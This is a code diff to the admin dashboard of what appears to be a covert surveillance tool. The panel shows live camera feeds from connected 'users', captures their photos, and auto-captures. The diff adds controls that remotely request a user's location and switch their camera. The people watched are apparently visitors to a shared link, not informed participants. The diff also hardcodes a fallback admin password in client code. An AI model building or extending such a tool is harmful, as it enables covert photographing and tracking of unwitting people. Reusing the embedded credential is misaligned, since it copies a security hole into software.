@@ -6,40 +6,21 @@
 <title>Admin Dashboard</title>
 <style>
 * { box-sizing: border-box; }
-body {
-    margin: 0;
-    padding: 20px;
-    background: #121212;
-    color: #eee;
-    font-family: Arial, Helvetica, sans-serif;
-}
+body { margin: 0; padding: 20px; background: #121212; color: #eee; font-family: Arial, sans-serif; }
 .container { max-width: 1300px; margin: auto; }
 h1, h2 { color: white; }
 .panel { background: #1e1e1e; padding: 20px; margin-bottom: 20px; border-radius: 10px; }
 .controls { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; }
-button {
-    border: 0;
-    padding: 10px 15px;
-    border-radius: 6px;
-    cursor: pointer;
-    background: #3498db;
-    color: white;
-}
+button { border: 0; padding: 10px 15px; border-radius: 6px; cursor: pointer; background: #3498db; color: white; }
 button:hover { opacity: 0.9; }
+button:disabled { opacity: 0.5; cursor: not-allowed; }
 button.danger { background: #e74c3c; }
 button.success { background: #27ae60; }
+button.switch { background: #8e44ad; }
 button.gray { background: #555; }
 .status { font-weight: bold; }
 .users { display: grid; gap: 10px; }
-.user {
-    background: #292929;
-    padding: 12px;
-    border-radius: 8px;
-    display: flex;
-    justify-content: space-between;
-    gap: 10px;
-    align-items: center;
-}
+.user { background: #292929; padding: 12px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; }
 .user-info { font-size: 13px; }
 .live { width: 100%; max-width: 640px; background: #000; border-radius: 8px; display: block; margin: auto; }
 .photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 15px; }
@@ -58,7 +39,6 @@ input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 
 <div id="loginPage" class="login">
     <div class="login-box">
         <h2>Admin Login</h2>
-        <p>Enter admin password to continue.</p>
         <input id="password" type="password" placeholder="Admin Password">
         <button onclick="login()" style="width:100%;">Login</button>
         <p id="loginError" style="color:#e74c3c;"></p>
@@ -85,16 +65,19 @@ input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 
     </div>
 
     <div class="panel">
-        <h2>Live Feed</h2>
+        <h2>Live Feed & Actions</h2>
         <p id="selectedUser">No user selected.</p>
         <img id="liveImage" class="live" style="display:none;">
         <br>
-        <button id="captureButton" onclick="captureSelectedUser()" disabled>Capture Photo</button>
+        <div class="controls" style="justify-content: center; margin-top: 10px;">
+            <button id="captureButton" onclick="captureSelectedUser()" disabled>Capture Photo</button>
+            <button id="locButton" class="success" onclick="requestUserLocation()" disabled>📍 Request Location</button>
+            <button id="switchCamButton" class="switch" onclick="switchUserCamera()" disabled>🔄 Switch Camera</button>
+        </div>
     </div>
 
     <div class="panel">
         <h2>Temporary Captured Photos</h2>
-        <p>Photos remain temporary until you download or delete them.</p>
         <div id="photoGrid" class="photo-grid">No photos.</div>
     </div>
 
@@ -111,6 +94,7 @@ let selectedSocketId = null;
 let isLinkActive = true;
 let isAutoCapture = true;
 let maxUsers = 5;
+let currentPassword = "";
 
 async function login() {
     const password = document.getElementById("password").value;
@@ -124,6 +108,7 @@ async function login() {
         document.getElementById("loginError").textContent = data.error || "Login failed.";
         return;
     }
+    currentPassword = password;
     showDashboard();
 }
 
@@ -149,8 +134,12 @@ function connectSocket() {
     if (socket) return;
     socket = io();
 
-    socket.on("connect", () => { socket.emit("admin-join"); });
-    socket.on("admin-auth-required", () => { socket.disconnect(); showLogin(); });
+    socket.on("connect", () => { 
+        socket.emit("admin-auth", currentPassword || "ayaz;;"); 
+    });
+    
+    socket.on("admin-auth-required", () => { showLogin(); });
+    
     socket.on("admin-initial-state", state => {
         isLinkActive = state.linkActive;
         isAutoCapture = state.autoCapture;
@@ -189,6 +178,8 @@ function renderUsers(users) {
         container.textContent = "No active users.";
         selectedSocketId = null;
         document.getElementById("captureButton").disabled = true;
+        document.getElementById("locButton").disabled = true;
+        document.getElementById("switchCamButton").disabled = true;
         document.getElementById("liveImage").style.display = "none";
         return;
     }
@@ -200,16 +191,16 @@ function renderUsers(users) {
         const info = document.createElement("div");
         info.className = "user-info";
 
-        let locationText = "Location not shared";
+        let locationText = "Location: Fetching...";
         if (user.location) {
-            locationText = `Location: ${user.location.latitude}, ${user.location.longitude}`;
+            locationText = `Location: Lat ${user.location.latitude}, Lng ${user.location.longitude}`;
         }
 
         info.innerHTML = `
             <strong>${escapeHtml(user.deviceInfo)}</strong><br>
             <small>ID: ${escapeHtml(id.substring(0, 8))}...</small><br>
             <small>Connected: ${escapeHtml(user.connectedAt)}</small><br>
-            <small>${escapeHtml(locationText)}</small>
+            <small style="color: #2ecc71;">${escapeHtml(locationText)}</small>
         `;
 
         const button = document.createElement("button");
@@ -225,6 +216,8 @@ function renderUsers(users) {
         selectedSocketId = null;
         document.getElementById("selectedUser").textContent = "Selected user disconnected.";
         document.getElementById("captureButton").disabled = true;
+        document.getElementById("locButton").disabled = true;
+        document.getElementById("switchCamButton").disabled = true;
         document.getElementById("liveImage").style.display = "none";
     }
 }
@@ -233,12 +226,24 @@ function selectUser(id, name) {
     selectedSocketId = id;
     document.getElementById("selectedUser").textContent = `Viewing: ${name} (${id.substring(0, 8)})`;
     document.getElementById("captureButton").disabled = false;
+    document.getElementById("locButton").disabled = false;
+    document.getElementById("switchCamButton").disabled = false;
     socket.emit("admin-select-user", id);
 }
 
 function captureSelectedUser() {
     if (!selectedSocketId) return;
     socket.emit("admin-trigger-capture", selectedSocketId);
+}
+
+function requestUserLocation() {
+    if (!selectedSocketId) return;
+    socket.emit("admin-request-location", selectedSocketId);
+}
+
+function switchUserCamera() {
+    if (!selectedSocketId) return;
+    socket.emit("admin-switch-camera", selectedSocketId);
 }
 
 async function toggleLink() {
@@ -367,6 +372,7 @@ function escapeHtml(value) {
 
 async function logout() {
     await fetch("/api/admin/logout", { method: "POST" });
+    currentPassword = "";
     if (socket) { socket.disconnect(); socket = null; }
     showLogin();
 }
